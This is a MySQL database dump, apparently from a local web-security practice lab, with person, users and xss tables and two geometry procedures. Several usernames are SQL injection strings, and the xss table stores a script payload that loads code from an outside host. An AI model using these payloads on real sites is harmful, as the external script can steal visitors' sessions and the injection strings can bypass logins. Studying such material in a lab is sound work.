/*
Navicat MySQL Data Transfer

Source Server         : 192.168.98.129_Xampp
Source Server Version : 50505
Source Host           : 192.168.98.129:3306
Source Database       : test

Target Server Type    : MYSQL
Target Server Version : 50505
File Encoding         : 65001

Date: 2022-12-09 10:18:30
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for person
-- ----------------------------
DROP TABLE IF EXISTS `person`;
CREATE TABLE `person` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) DEFAULT NULL,
  `money` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1 ROW_FORMAT=COMPACT;

-- ----------------------------
-- Records of person
-- ----------------------------
INSERT INTO `person` VALUES ('1', 'wangwu', '10');
INSERT INTO `person` VALUES ('2', 'apache', '20');

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `address` varchar(255) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `ip` varchar(255) DEFAULT NULL,
  `content` text,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=latin1 ROW_FORMAT=COMPACT;

-- ----------------------------
-- Records of users
-- ----------------------------
INSERT INTO `users` VALUES ('1', 'zhangsan', 'ahangsandemima', 'China Zeijing', 'zhangsan@qq.com', '127.0.0.1', null);
INSERT INTO `users` VALUES ('2', 'lisi', 'lisidemima', 'China Shanghai', 'lisi@qq.com', '192.168.1.1', null);
INSERT INTO `users` VALUES ('4', 'test', '098f6bcd4621d373cade4e832627b4f6', '', null, null, '');
INSERT INTO `users` VALUES ('5', 'kevin1', 'e10adc3949ba59abbe56e057f20f883e', null, null, null, null);
INSERT INTO `users` VALUES ('6', 'kevin2', 'e10adc3949ba59abbe56e057f20f883e', null, null, null, null);
INSERT INTO `users` VALUES ('7', 'kevin2\'', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('8', 'kevin3', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('9', 'test2\' order by 1', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('10', 'test2\' order by 1#', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('11', '', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('12', '', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('13', '', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('14', 'kevin4', 'e10adc3949ba59abbe56e057f20f883e', null, null, null, null);
INSERT INTO `users` VALUES ('15', '\'abc\' or 1=1 limit 1,1', 'e10adc3949ba59abbe56e057f20f883e', null, null, null, null);
INSERT INTO `users` VALUES ('16', 'abc\' or 1=1 limit 1,1', 'e10adc3949ba59abbe56e057f20f883e', null, null, null, null);
INSERT INTO `users` VALUES ('17', 'abc\'  or  1=1 limit 1,1', 'd41d8cd98f00b204e9800998ecf8427e', null, null, null, null);
INSERT INTO `users` VALUES ('18', 'abc\'  or  1=1 limit 1,1# ', 'e10adc3949ba59abbe56e057f20f883e', null, null, null, null);

-- ----------------------------
-- Table structure for xss
-- ----------------------------
DROP TABLE IF EXISTS `xss`;
CREATE TABLE `xss` (
  `title` varchar(255) NOT NULL,
  `content` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`title`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=latin1 ROW_FORMAT=COMPACT;

-- ----------------------------
-- Records of xss
-- ----------------------------
INSERT INTO `xss` VALUES ('1', '</tExtArEa>\'\"><sCRiPt sRC=http://xss.fbisb.com/GUYG></sCrIpT>');

-- ----------------------------
-- Procedure structure for AddGeometryColumn
-- ----------------------------
DROP PROCEDURE IF EXISTS `AddGeometryColumn`;
DELIMITER ;;
CREATE DEFINER=`` PROCEDURE `AddGeometryColumn`(catalog varchar(64), t_schema varchar(64),
   t_name varchar(64), geometry_column varchar(64), t_srid int)
begin
  set @qwe= concat('ALTER TABLE ', t_schema, '.', t_name, ' ADD ', geometry_column,' GEOMETRY REF_SYSTEM_ID=', t_srid); PREPARE ls from @qwe; execute ls; deallocate prepare ls; end
;;
DELIMITER ;

-- ----------------------------
-- Procedure structure for DropGeometryColumn
-- ----------------------------
DROP PROCEDURE IF EXISTS `DropGeometryColumn`;
DELIMITER ;;
CREATE DEFINER=`` PROCEDURE `DropGeometryColumn`(catalog varchar(64), t_schema varchar(64),
   t_name varchar(64), geometry_column varchar(64))
begin
  set @qwe= concat('ALTER TABLE ', t_schema, '.', t_name, ' DROP ', geometry_column); PREPARE ls from @qwe; execute ls; deallocate prepare ls; end
;;
DELIMITER ;
